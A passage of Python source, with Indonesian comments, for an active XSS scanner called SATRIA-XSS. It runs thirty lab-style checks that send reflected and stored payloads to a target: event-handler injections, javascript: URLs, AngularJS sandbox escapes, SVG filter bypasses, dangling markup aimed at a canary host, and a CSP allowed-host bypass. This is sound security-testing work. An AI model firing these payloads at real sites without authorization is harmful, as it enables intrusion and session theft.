    def _lab_03(self) -> tuple[bool, str, dict[str, Any]]:
        for url, js in self._dom_blocks():
            if not re.search(r"document\.write(?:ln)?\s*\(", js):
                continue
            if not re.search(r"location\.(?:search|href)|URLSearchParams|document\.URL", js):
                continue
            if re.search(r"<select", js, re.I):
                continue  # vektor 10 yang memiliki kasus <select>
            return True, "Sink document.write() menerima data dari location.search pada skrip " + url + ".", {
                "url": url, "sink": "document.write", "source": "location.search"}
        return self._no("Tidak ditemukan alur location.search -> document.write pada skrip yang dipindai.")

    def _lab_04(self) -> tuple[bool, str, dict[str, Any]]:
        for url, js in self._dom_blocks():
            if not re.search(r"\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML\s*\(", js):
                continue
            if not re.search(r"location\.(?:search|href)|URLSearchParams|document\.URL", js):
                continue
            return True, "Sink innerHTML/insertAdjacentHTML dialiri location.search pada skrip " + url + ".", {
                "url": url, "sink": "innerHTML", "source": "location.search"}
        return self._no("Tidak ditemukan alur location.search -> innerHTML pada skrip yang dipindai.")

    def _lab_05(self) -> tuple[bool, str, dict[str, Any]]:
        for url, js in self._dom_blocks():
            if not re.search(r"location\.search|URLSearchParams", js):
                continue
            if not re.search(r"\.attr\(\s*['\"]href['\"]|\.href\s*=|\$\([^)]*\)\.prop\(\s*['\"]href['\"]", js):
                continue
            return True, "Sink atribut href (jQuery/DOM) dialiri location.search pada skrip " + url + ".", {
                "url": url, "sink": "anchor.href", "source": "location.search"}
        return self._no("Tidak ditemukan alur location.search -> atribut href pada skrip yang dipindai.")

    def _lab_06(self) -> tuple[bool, str, dict[str, Any]]:
        for url, js in self._dom_blocks():
            if not re.search(r"hashchange|location\.hash", js):
                continue
            if not re.search(r"\$\(|jQuery", js):
                continue
            if not re.search(r"\$\(\s*[^)]*hash|location\.hash", js):
                continue
            return True, "Selector jQuery memakai location.hash/hashchange sebagai sumber pada skrip " + url + ".", {
                "url": url, "sink": "jQuery.selector", "source": "location.hash"}
        return self._no("Tidak ditemukan alur location.hash -> selector jQuery pada skrip yang dipindai.")

    def _lab_07(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = '" autofocus onfocus=alert(' + "'" + marker + "'" + ') x="'
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload breakout atribut tidak ter-refleksi.")
        if self._fp_is("<", "raw") or self._fp_is(">", "raw"):
            return self._no("Angle bracket tidak di-encode; ini bukan skenario atribut dengan < > ter-encode.")
        if not self._fp_is('"', "raw"):
            return self._no("Kutip ganda ikut di-encode; breakout atribut tidak terkonfirmasi.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_tag"]:
                continue
            if not re.search(r"onfocus\s*=\s*alert\(", body, re.I):
                continue
            if self._claim("attr_breakout:" + str(meta.get("key"))):
                return True, "Breakout atribut berhasil: < > di-encode tetapi kutip ganda mentah sehingga handler onfocus menjadi atribut baru.", {
                    "context": "attribute_breakout", **meta}
        return self._no("Tidak ada breakout atribut dengan angle bracket ter-encode.")

    def _lab_08(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "javascript:alert('" + marker + "')"

        def checker(body: str, _payload: str, mk: str) -> bool:
            for tag in re.findall(r"<a\b[^>]*>", body, re.I | re.S):
                if mk in tag and re.search(r"href\s*=\s*['\"][^'\"]*javascript:", tag, re.I):
                    return True
            return False

        result = self._stored_probe(payload, checker)
        if result[0]:
            return result[0], result[1] + " Atribut href menerima skema javascript: meski kutip ganda di-encode.", result[2]
        return result

    def _lab_09(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "'-alert('" + marker + "')-'"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload string JS tidak ter-refleksi.")
        if self._fp_is("<", "raw") or self._fp_is(">", "raw"):
            return self._no("Angle bracket tidak di-encode; bukan skenario 'angle brackets HTML encoded'.")
        if not self._fp_is("'", "raw"):
            return self._no("Kutip tunggal di-encode, sehingga breakout string tidak terkonfirmasi.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_script"]:
                continue
            if ctx["js"] not in ("sq", "dq"):
                continue
            if self._claim("js_sq:" + str(meta.get("key"))):
                return True, "Payload keluar dari string JavaScript (kutip tunggal mentah, < > ter-encode) di " + str(meta.get("url")) + ".", {
                    "context": "js_string_single_quote", **meta}
        return self._no("Tidak ada breakout string JavaScript dengan angle bracket ter-encode.")

    def _lab_10(self) -> tuple[bool, str, dict[str, Any]]:
        for url, js in self._dom_blocks():
            if not re.search(r"document\.write(?:ln)?\s*\(", js):
                continue
            if not re.search(r"<select", js, re.I):
                continue
            if not re.search(r"location\.(?:search|href)|URLSearchParams", js):
                continue
            return True, "document.write(location.search) menulis ke dalam elemen <select> pada skrip " + url + ".", {
                "url": url, "sink": "document.write(select)", "source": "location.search"}
        return self._no("Tidak ditemukan document.write ke dalam <select> yang dialiri location.search.")

    def _lab_11(self) -> tuple[bool, str, dict[str, Any]]:
        if not self._angular_present():
            return self._no("Tidak ada elemen dengan ng-app; ekspresi AngularJS tidak dievaluasi.")
        if self._fp_is("<", "raw"):
            return self._no("Angle bracket tidak di-encode; bukan skenario ekspresi AngularJS ter-encode.")
        marker = _random_token()
        payload = "{{constructor.constructor('alert(1)')()}}" + marker
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Ekspresi AngularJS tidak ter-refleksi.")
        scopes = self._angular_scopes()
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or ctx["in_script"]:
                continue
            if not any(start <= ctx["pos"] <= end for _url, start, end in scopes):
                continue
            return True, "Ekspresi {{...}} ter-refleksi mentah di dalam scope ng-app; AngularJS akan mengevaluasinya.", {
                "context": "angular_expression", **meta}
        return self._no("Ekspresi AngularJS tidak ter-refleksi di dalam scope ng-app.")

    def _lab_12(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "<img src=x onerror=alert('" + marker + "')>"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload tidak ter-refleksi; alur reflected-DOM tidak dapat diverifikasi.")
        sink_blocks = [
            (url, js) for url, js in self._dom_blocks()
            if re.search(r"innerHTML|insertAdjacentHTML|document\.write|eval\s*\(|JSON\.parse", js)
        ]
        if not sink_blocks:
            return self._no("Tidak ditemukan sink DOM pada skrip klien.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or ctx["in_comment"] or not ctx["in_script"]:
                continue
            if self._claim("reflected_dom:" + str(meta.get("key"))):
                return True, "Payload ter-refleksi ke dalam blok <script> dan halaman memiliki sink DOM (" + sink_blocks[0][0] + ").", {
                    "context": "reflected_dom", "sink_page": sink_blocks[0][0], **meta}
        return self._no("Refleksi tidak berada di dalam blok script yang terhubung ke sink DOM.")

    def _lab_13(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "<img src=x onerror=alert('" + marker + "')>"

        def checker(body: str, p: str, mk: str) -> bool:
            if not re.search(r"innerHTML|insertAdjacentHTML|document\.write", body, re.I):
                return False
            for ctx in _analyze_reflection(body, p, mk):
                if ctx["exact"] and ctx["in_script"]:
                    return True
            return False

        return self._stored_probe(payload, checker)

    def _tag_allowed(self, tag: str) -> bool:
        key = "tag:" + tag
        if key in self._tag_cache:
            return self._tag_cache[key]
        marker = _random_token()
        payload = "<" + tag + " data-sx=" + marker + ">"
        ok, body, _meta = self._probe(payload)
        allowed = bool(ok and re.search(r"<\s*" + re.escape(tag) + r"\b", body, re.I))
        self._tag_cache[key] = allowed
        return allowed

    def _try_handler_payload(self, builder: Callable[[str], str], pattern: str,
                             claim: str) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = builder(marker)
        ok, body, meta = self._probe(payload)
        if not ok:
            return False, "", {}
        if re.search(pattern.format(m=re.escape(marker)), body, re.I):
            if self._claim(claim):
                return True, body, {"marker": marker, **meta}
        return False, body, {}

    def _lab_14(self) -> tuple[bool, str, dict[str, Any]]:
        if self._tag_allowed("script"):
            return self._no("Tag <script> tidak diblokir; tidak ada filter tag untuk dilewati (lihat vektor 01).")
        attempts = [
            ("img", lambda m: "<img src=x onerror=alert('" + m + "')>", r"onerror\s*=\s*alert\(\s*['\"]?{m}"),
            ("body", lambda m: "<body onload=alert('" + m + "')>", r"onload\s*=\s*alert\(\s*['\"]?{m}"),
            ("svg", lambda m: "<svg onload=alert('" + m + "')>", r"onload\s*=\s*alert\(\s*['\"]?{m}"),
            ("iframe", lambda m: '<iframe src="javascript:alert(\'' + m + "')\">", r"javascript:\s*alert\(\s*['\"]?{m}"),
        ]
        for tag, builder, pattern in attempts:
            ok, _body, meta = self._try_handler_payload(builder, pattern, "tag_bypass:" + tag)
            if ok:
                return True, "Tag <script> diblokir, tetapi <" + tag + "> dengan event handler lolos filter dan ter-refleksi mentah.", {
                    "bypass_tag": tag, **meta}
        return self._no("Tidak ada bypass tag/atribut yang terkonfirmasi (atau filter tag tidak ada).")

    def _lab_15(self) -> tuple[bool, str, dict[str, Any]]:
        for tag in ("script", "img", "body", "svg", "iframe"):
            if self._tag_allowed(tag):
                return self._no("Tag <" + tag + "> masih diterima; bukan skenario 'semua tag diblokir kecuali custom'.")
        ok, _body, meta = self._try_handler_payload(
            lambda m: "<xss id=x tabindex=1 onfocus=alert('" + m + "') autofocus>",
            r"onfocus\s*=\s*alert\(\s*['\"]?{m}", "custom_tag")
        if ok:
            return True, "Semua tag standar diblokir, tetapi custom element <xss> dengan handler diterima.", {
                "bypass_tag": "xss", **meta}
        return self._no("Tidak ada custom element ber-handler yang lolos filter.")

    def _lab_16(self) -> tuple[bool, str, dict[str, Any]]:
        if self._tag_allowed("script"):
            return self._no("Tag <script> tidak diblokir; bukan skenario 'sebagian markup SVG diizinkan'.")
        if not self._tag_allowed("svg"):
            return self._no("Markup <svg> juga diblokir, sehingga tidak ada SVG yang dapat dipakai.")
        attempts = [
            (lambda m: "<svg><animatetransform onbegin=alert('" + m + "')>",
             r"onbegin\s*=\s*alert\(\s*['\"]?{m}", "svg_event"),
            (lambda m: "<svg><animate attributeName=href values=javascript:alert('" + m + "') /><text x=20 y=20>x</text></svg>",
             r"values\s*=\s*javascript:\s*alert\(\s*['\"]?{m}", "svg_animate"),
        ]
        for builder, pattern, claim in attempts:
            ok, _body, meta = self._try_handler_payload(builder, pattern, "svg:" + claim)
            if ok:
                return True, "Markup SVG dengan event/animasi berbahaya ter-refleksi mentah meski <script> diblokir.", {
                    "bypass": claim, **meta}
        return self._no("Tidak ada markup SVG berbahaya yang lolos filter.")

    def _lab_17(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "' accesskey='x' onclick='alert(" + marker + ")' x='"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload tidak ter-refleksi di tag canonical.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_tag"]:
                continue
            lt = body.rfind("<", 0, ctx["pos"])
            gt = body.find(">", ctx["pos"])
            tag_html = body[lt:gt + 1] if lt != -1 and gt != -1 else ""
            if not re.search(r"rel\s*=\s*['\"]?canonical", tag_html, re.I):
                continue
            if not re.search(r"onclick\s*=", tag_html, re.I):
                continue
            if self._claim("canonical:" + str(meta.get("key"))):
                return True, "Tag <link rel=canonical> dapat di-breakout dan menerima handler onclick.", {
                    "context": "canonical_link", **meta}
        return self._no("Tidak ada breakout pada tag canonical link.")

    def _lab_18(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "</script><script>alert('" + marker + "')</script>"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload </script> tidak ter-refleksi.")
        if self._fp_is("<", "raw") is False:
            return self._no("Angle bracket di-encode; </script> tidak dapat keluar dari blok script.")
        if self._fp_is("'", "raw") or self._fp_is("\\", "raw"):
            return self._no("Kutip tunggal/backslash tidak di-escape; bukan skenario 'single quote dan backslash escaped'.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_script"]:
                continue
            if self._claim("js_script_break:" + str(meta.get("key"))):
                return True, "Kutip tunggal & backslash di-escape, tetapi </script> lolos mentah sehingga blok script dapat ditutup.", {
                    "context": "js_script_breakout", **meta}
        return self._no("Tidak ada breakout </script> pada string JavaScript.")

    def _lab_19(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "\\';alert('" + marker + "');//"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload escape backslash tidak ter-refleksi.")
        if not (self._fp_is("<", "encoded") and self._fp_is('"', "encoded")):
            return self._no("Angle bracket/kutip ganda tidak di-encode; bukan skenario gabungan lab ini.")
        if not self._fp_is("'", "encoded"):
            return self._no("Kutip tunggal tidak di-escape, sehingga trik escape backslash tidak relevan.")
        if not self._fp_is("\\", "raw"):
            return self._no("Backslash ikut di-escape; trik escape backslash tidak dapat dipakai.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_script"] or ctx["js"] != "sq":
                continue
            if self._claim("js_bs_escape:" + str(meta.get("key"))):
                return True, "Backslash tidak di-escape sementara kutip tunggal di-escape: payload dapat keluar dari string JS.", {
                    "context": "js_backslash_escape", **meta}
        return self._no("Tidak ada breakout string JS lewat escape backslash.")

    def _lab_20(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "&apos;-alert(" + marker + ")-&apos;"

        def checker(body: str, _payload: str, mk: str) -> bool:
            for tag in re.findall(r"<[^>]+>", body, re.S):
                if mk in tag and re.search(r"\bon[a-z]+\s*=", tag, re.I):
                    return True
            return False

        result = self._stored_probe(payload, checker)
        if result[0]:
            return result[0], result[1] + " Nilai tersimpan masuk ke atribut event (onclick/on*) tanpa netralisasi.", result[2]
        return result

    def _lab_21(self) -> tuple[bool, str, dict[str, Any]]:
        marker = _random_token()
        payload = "${alert(" + marker + ")}"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload template literal tidak ter-refleksi.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_script"] or ctx["js"] != "tpl":
                continue
            if self._claim("template:" + str(meta.get("key"))):
                return True, "Payload ${...} ter-refleksi di dalam template literal (backtick) tanpa escape.", {
                    "context": "template_literal", **meta}
        return self._no("Refleksi tidak berada di dalam template literal yang dapat di-escape.")

    def _executable_confirmed(self) -> list[int]:
        return sorted(
            lab_id for lab_id in _EXECUTABLE_LAB_IDS
            if self._results.get(lab_id, {}).get("confirmed")
        )

    def _lab_22(self) -> tuple[bool, str, dict[str, Any]]:
        deps = self._executable_confirmed()
        if not deps:
            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak pencurian cookie tidak dapat diklaim.")
        if not self._set_cookies:
            return self._no("Tidak ada cookie sesi yang teramati (Set-Cookie), klaim pencurian cookie tidak dapat dibuktikan.")
        if all("httponly" in cookie.lower() for cookie in self._set_cookies):
            return self._no("Semua cookie teramati memakai HttpOnly; document.cookie tidak dapat dibaca.")
        return True, ("Vektor XSS executable terkonfirmasi (" + ", ".join(str(d) for d in deps)
                      + ") dan ada cookie tanpa HttpOnly -> cookie dapat dicuri."), {
            "depends_on": deps, "impact": "cookie_theft"}

    def _lab_23(self) -> tuple[bool, str, dict[str, Any]]:
        deps = self._executable_confirmed()
        if not deps:
            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak penangkapan password tidak dapat diklaim.")
        has_password = any(re.search(r"type\s*=\s*['\"]?password", page.text or "", re.I) for page in self.pages)
        if not has_password:
            return self._no("Tidak ada form password pada halaman yang dipindai; klaim penangkapan password tidak dapat dibuktikan.")
        return True, ("Vektor XSS executable (" + ", ".join(str(d) for d in deps)
                      + ") + form password tersedia -> kredensial dapat ditangkap."), {
            "depends_on": deps, "impact": "password_capture"}

    def _lab_24(self) -> tuple[bool, str, dict[str, Any]]:
        deps = self._executable_confirmed()
        if not deps:
            return self._no("Belum ada vektor XSS executable yang terkonfirmasi; dampak bypass CSRF tidak dapat diklaim.")
        token_field = False
        for page in self.pages:
            for form in page.forms:
                for name, _value, _input_type in form.fields:
                    if re.search(r"csrf|authenticity|_token|token", name, re.I):
                        token_field = True
        if not token_field:
            return self._no("Tidak ada field token CSRF yang teramati; klaim bypass CSRF tidak dapat dibuktikan.")
        return True, ("Vektor XSS executable (" + ", ".join(str(d) for d in deps)
                      + ") + form ber-token CSRF -> permintaan ber-CSRF dapat dipalsukan."), {
            "depends_on": deps, "impact": "csrf_bypass"}

    def _angular_sandbox(self, require_csp: bool) -> tuple[bool, str, dict[str, Any]]:
        if not self._angular_present():
            return self._no("Tidak ada ng-app; sandbox AngularJS tidak dapat diuji.")
        if require_csp and not self._csp_header:
            return self._no("Tidak ada header CSP; skenario 'sandbox escape + CSP' tidak berlaku.")
        marker = _random_token()
        payload = ("{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:"
                   "toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}" + marker)
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload sandbox escape tidak ter-refleksi.")
        scopes = self._angular_scopes()
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or ctx["in_script"]:
                continue
            if not any(start <= ctx["pos"] <= end for _url, start, end in scopes):
                continue
            return True, "Ekspresi sandbox-escape AngularJS ter-refleksi mentah di dalam scope ng-app.", {
                "context": "angular_sandbox", "csp": self._csp_header[:200], **meta}
        return self._no("Ekspresi sandbox escape tidak ter-refleksi di dalam scope ng-app.")

    def _lab_25(self) -> tuple[bool, str, dict[str, Any]]:
        return self._angular_sandbox(require_csp=False)

    def _lab_26(self) -> tuple[bool, str, dict[str, Any]]:
        result = self._angular_sandbox(require_csp=True)
        if result[0]:
            return result[0], result[1] + " CSP terdeteksi: " + self._csp_header[:120], result[2]
        return result

    def _probe_stripped(self, payload: str, pattern: str) -> bool | None:
        ok, body, _meta = self._probe(payload)
        if not ok:
            return None
        return not re.search(pattern, body, re.I)

    def _lab_27(self) -> tuple[bool, str, dict[str, Any]]:
        control_marker = _random_token()
        event_blocked = self._probe_stripped(
            "<img src=x onerror=alert('" + control_marker + "')>", r"onerror\s*=\s*alert")
        href_blocked = self._probe_stripped(
            '<a href="javascript:alert(\'' + control_marker + "')\">x</a>", r"javascript:")
        if event_blocked is None or href_blocked is None:
            return self._no("Payload kontrol tidak ter-refleksi; status blokir tidak dapat diverifikasi.")
        if not (event_blocked and href_blocked):
            return self._no("Event handler dan/atau href tidak terbukti diblokir; vektor bypass tidak dapat diklaim.")
        marker = _random_token()
        payload = ("<svg><animate attributeName=href values=javascript:alert('"
                   + marker + "') /><a><text x=20 y=20>c</text></a></svg>")
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload bypass tidak ter-refleksi.")
        if re.search(r"values\s*=\s*javascript:\s*alert\(\s*['\"]?" + re.escape(marker), body, re.I):
            return True, "Event handler & href diblokir, tetapi <animate attributeName=href values=javascript:...> lolos.", {
                "context": "svg_animate_href", **meta}
        return self._no("Payload bypass SVG tidak lolos filter.")

    def _lab_28(self) -> tuple[bool, str, dict[str, Any]]:
        control_marker = _random_token()
        blocked = self._probe_stripped(
            '<a href="javascript:alert(\'' + control_marker + "')\">x</a>", r"javascript:")
        if blocked is None:
            return self._no("Payload kontrol tidak ter-refleksi; status blokir tidak dapat diverifikasi.")
        if not blocked:
            return self._no("Skema javascript: tidak diblokir; bukan skenario 'beberapa karakter diblokir'.")
        marker = _random_token()
        payload = '<a href="&#106;avascript:alert(\'' + marker + "')\">x</a>"
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload bypass JavaScript URL tidak ter-refleksi.")
        if re.search(r"href\s*=\s*['\"]?&#106;?avascript:\s*alert\(", body, re.I):
            return True, "Skema javascript: diblokir, tetapi varian ter-encode (&#106;avascript:) lolos di atribut href.", {
                "context": "js_url_encoded", **meta}
        return self._no("Tidak ada varian JavaScript URL ter-encode yang lolos.")

    def _lab_29(self) -> tuple[bool, str, dict[str, Any]]:
        csp = self._csp_header
        if not _csp_is_strict(csp):
            return self._no("CSP tidak ketat (atau tidak ada), sehingga skenario dangling markup tidak berlaku.")
        marker = _random_token()
        payload = '<img src="//satria-canary.invalid/?' + marker
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload dangling markup tidak ter-refleksi.")
        for ctx in _analyze_reflection(body, payload, marker):
            if not ctx["exact"] or not ctx["in_tag"] or not ctx["in_attr"]:
                continue
            if ctx["attr_name"] != "src":
                continue
            return True, "CSP ketat memblokir inline script, tetapi tag <img src=...> tak tertutup (dangling markup) ter-refleksi mentah dan dapat mengeksfiltrasi data.", {
                "context": "dangling_markup", "csp": csp[:200], **meta}
        return self._no("Tidak ada refleksi dangling markup pada konteks yang dapat mengeksfiltrasi data.")

    def _lab_30(self) -> tuple[bool, str, dict[str, Any]]:
        csp = self._csp_header
        if not csp:
            return self._no("Tidak ada header CSP; skenario bypass CSP tidak berlaku.")
        sources = _csp_script_sources(csp)
        hosts = [s for s in sources if s.startswith(("http://", "https://", "//"))]
        if not hosts:
            return self._no("CSP tidak mengizinkan host skrip (tanpa host source); tidak ada jalur bypass.")
        host = hosts[0].split("//", 1)[-1].strip("/")
        marker = _random_token()
        payload = '<script src="//' + host + "/satria-" + marker + '.js"></script>'
        ok, body, meta = self._probe(payload)
        if not ok:
            return self._no("Payload <script src=host-izin> tidak ter-refleksi.")
        if re.search(r"<script[^>]+src\s*=\s*['\"]?//" + re.escape(host), body, re.I):
            return True, "CSP mengizinkan host " + host + "; payload <script src=host-izin> ter-refleksi mentah sehingga CSP dapat dilewati.", {
                "context": "csp_bypass", "allowed_host": host, "csp": csp[:200], **meta}
        return self._no("Payload script dari host yang diizinkan CSP tidak ter-refleksi mentah.")

    # =======================================================================
    # Orkestrasi
    # =======================================================================
    def _test_all_labs(self) -> None:
        tests: dict[int, Callable[[], tuple[bool, str, dict[str, Any]]]] = {
            1: self._lab_01, 2: self._lab_02, 3: self._lab_03, 4: self._lab_04,
            5: self._lab_05, 6: self._lab_06, 7: self._lab_07, 8: self._lab_08,
            9: self._lab_09, 10: self._lab_10, 11: self._lab_11, 12: self._lab_12,
            13: self._lab_13, 14: self._lab_14, 15: self._lab_15, 16: self._lab_16,
            17: self._lab_17, 18: self._lab_18, 19: self._lab_19, 20: self._lab_20,
            21: self._lab_21, 22: self._lab_22, 23: self._lab_23, 24: self._lab_24,
            25: self._lab_25, 26: self._lab_26, 27: self._lab_27, 28: self._lab_28,
            29: self._lab_29, 30: self._lab_30,
        }
        for lab_id, title, _key, _severity in CATALOG:
            self._lab_id = lab_id
            self._lab_used = 0
            print("[PROGRESS " + str(lab_id) + "/" + str(len(CATALOG)) + "] " + title)
            test = tests.get(lab_id)
            try:
                confirmed, evidence, details = test() if test else (False, "Lab tidak tersedia.", {})
            except Exception as exc:
                confirmed, evidence, details = False, "Error pengujian: " + type(exc).__name__ + ": " + str(exc), {}
                if len(self.stats["errors"]) < 40:
                    self.stats["errors"].append("lab " + str(lab_id) + ": " + str(exc))
            self._results[lab_id] = {
                "confirmed": bool(confirmed),
                "evidence": evidence or "",
                "details": details or {},
                "requests": self._lab_used,
            }
            print(("  [CONFIRMED] " if confirmed else "  [not-confirmed] ") + str(lab_id).zfill(2) + " " + title)

    def run(self) -> dict[str, Any]:
        self._crawl()
        self._discover_points()
        self._test_all_labs()
        return self._build_report()

    def _build_report(self) -> dict[str, Any]:
        labs: list[dict[str, Any]] = []
        confirmed_count = 0
        for lab_id, title, key, severity in CATALOG:
            result = self._results.get(lab_id, {"confirmed": False, "evidence": "", "details": {}})
            confirmed = bool(result.get("confirmed"))
            if confirmed:
                confirmed_count += 1
            labs.append({
                "id": lab_id,
                "title": title,
                "key": key,
                "severity": severity,
                "status": "confirmed" if confirmed else "not_confirmed",
                "evidence": result.get("evidence", ""),
                "details": result.get("details", {}),
                "requests": result.get("requests", 0),
            })
        return {
            "scanner": "SATRIA-XSS",
            "version": __version__,
            "target": self.target_url,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "mode": "active",
            "summary": {
                "confirmed": confirmed_count,
                "not_confirmed": len(CATALOG) - confirmed_count,
                "total": len(CATALOG),
            },
            "labs": labs,
            "scan_stats": {
                "pages_fetched": self.stats.get("pages_fetched", 0),
                "requests": self.stats.get("requests", 0),
                "points": len(self.points),
                "external_scripts": len(self._script_srcs),
                "csp": self._csp_header[:300],
                "errors": self.stats.get("errors", []),
            },
        }


def scan_target(
    target_url: str,
    *,
    authorized: bool = False,
    allow_private: bool = False,
    max_pages: int = 10,
    max_points: int = 24,
    max_requests: int = 900,
    timeout: float = 8.0,
    time_delay: float = 0.0,
    seed_html: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    scanner = SatriaXSSScanner(
        target_url,
        authorized=authorized,
        allow_private=allow_private,
        max_pages=max_pages,
        max_points=max_points,
        max_requests=max_requests,
        timeout=timeout,
        time_delay=time_delay,
        seed_html=seed_html,
    )
    return scanner.run()


# ===========================================================================
# Adapter kompatibel app.py
# ===========================================================================
def _runtime_bool(value: Any) -> bool:
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    return str(value).strip().lower() in {"1", "true", "yes", "y", "on"}


def _normalize_runtime_key(raw_key: Any) -> str:
    key = str(raw_key).strip().lower().replace("-", "_")
    while "__" in key:
        key = key.replace("__", "_")
    return key


_RUNTIME_TARGET_MAP: dict[str, str] = {
    "artifacts_dir": "ARTIFACTS_DIR",
    "output_dir": "ARTIFACTS_DIR",
    "work_dir": "ARTIFACTS_DIR",
    "scrape_path": "SCRAPE_PATH",
    "findings_path": "FINDINGS_PATH",
    "output_pdf": "OUTPUT_PDF",
    "pdf_path": "OUTPUT_PDF",
    "pdf": "OUTPUT_PDF",
    "kiosapi_base_url": "KIOSAPI_BASE_URL",
    "kiosapi_key": "KIOSAPI_API_KEY",
    "kiosapi_api_key": "KIOSAPI_API_KEY",
    "censys_token": "CENSYS_TOKEN",
    "nvd_api_key": "NVD_API_KEY",
    "authorized": "ACTIVE_SCAN_AUTHORIZED",
    "active_scan_authorized": "ACTIVE_SCAN_AUTHORIZED",
    "run_active_tools": "RUN_ACTIVE_TOOLS",
    "run_dir_brute": "RUN_DIR_BRUTE",
    "run_censys": "RUN_CENSYS",
    "run_nvd": "RUN_NVD",
    "enable_llm": "ENABLE_LLM",
    "allow_partial_tools": "ALLOW_PARTIAL_TOOLS",
    "scan_deadline_seconds": "SCAN_DEADLINE_SECONDS",
    "deadline_seconds": "SCAN_DEADLINE_SECONDS",
}
_RUNTIME_BOOL_TARGETS = {
    "ACTIVE_SCAN_AUTHORIZED", "RUN_ACTIVE_TOOLS", "RUN_DIR_BRUTE", "RUN_CENSYS",
    "RUN_NVD", "ENABLE_LLM", "ALLOW_PARTIAL_TOOLS",
}


def configure_runtime(*args: Any, **overrides: Any) -> dict[str, Any]:
    """Terima work_dir posisional (app.py) dan keyword runtime."""
    incoming: dict[str, Any] = {}
    for index, arg in enumerate(args):
        if arg is None:
            continue
        if index == 0 and isinstance(arg, (Path, os.PathLike)):
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if index == 0 and isinstance(arg, str) and arg.strip():
            incoming["ARTIFACTS_DIR"] = arg
            continue
        if hasattr(arg, "keys"):
            try:
                incoming.update({str(k): arg[k] for k in arg.keys()})
                continue
            except Exception:
                pass
        if hasattr(arg, "__dict__"):
            incoming.update({str(k): v for k, v in vars(arg).items()})
    incoming.update(overrides)

    applied: dict[str, Any] = {}
    ignored: list[str] = []
    for raw_key, value in incoming.items():
        key = _normalize_runtime_key(raw_key)
        target = _RUNTIME_TARGET_MAP.get(key)
        if target is None:
            ignored.append(str(raw_key))
            continue
        if target in _RUNTIME_BOOL_TARGETS:
            new_value: Any = _runtime_bool(value)
        elif target == "ARTIFACTS_DIR":
            new_value = Path(str(value)).expanduser()
        elif target == "SCAN_DEADLINE_SECONDS":
            try:
                new_value = float(value)
            except (TypeError, ValueError):
                new_value = globals().get("SCAN_DEADLINE_SECONDS", 600.0)
        else:
            new_value = value
        globals()[target] = new_value
        applied[target] = new_value
        _RUNTIME_CONFIG[target] = new_value

    artifacts = globals().get("ARTIFACTS_DIR")
    if isinstance(artifacts, Path):
        globals()["SCRAPE_PATH"] = str(artifacts / "scrape_result.json")
        globals()["FINDINGS_PATH"] = str(artifacts / "findings.json")
        if "OUTPUT_PDF" not in applied:
            globals()["OUTPUT_PDF"] = str(artifacts / "satria_report.pdf")

    config = get_runtime_config()
    config["_ignored"] = ignored
    return config


def get_runtime_config() -> dict[str, Any]:
    return {name: globals().get(name) for name in _RUNTIME_TARGET_MAP.values()}


def _load_kiosapi_api_key() -> str:
    return str(globals().get("KIOSAPI_API_KEY") or os.getenv("KIOSAPI_API_KEY") or "")


def persist_scrape_artifacts(scrape: dict[str, Any]) -> dict[str, Path]:
    data = scrape.get("data", scrape) if isinstance(scrape, dict) else {}
    if not isinstance(data, dict):
        data = {}
    html_text = data.get("html") or data.get("html-llm") or ""
    markdown_text = data.get("markdown") or data.get("markdown-llm") or ""
    if not str(html_text).strip():
        raise RuntimeError("Scraper tidak mengembalikan HTML. Tidak membuat laporan tanpa bukti HTML.")
    meta = scrape.get("meta", {}) if isinstance(scrape.get("meta"), dict) else {}
    url = meta.get("url") or (scrape.get("url") if isinstance(scrape, dict) else None) or "unknown"
    artifacts_dir = Path(globals().get("ARTIFACTS_DIR") or Path("artifacts")).expanduser()
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    slug = _slugify(str(url))
    html_path = artifacts_dir / ("scrape_" + slug + ".html")
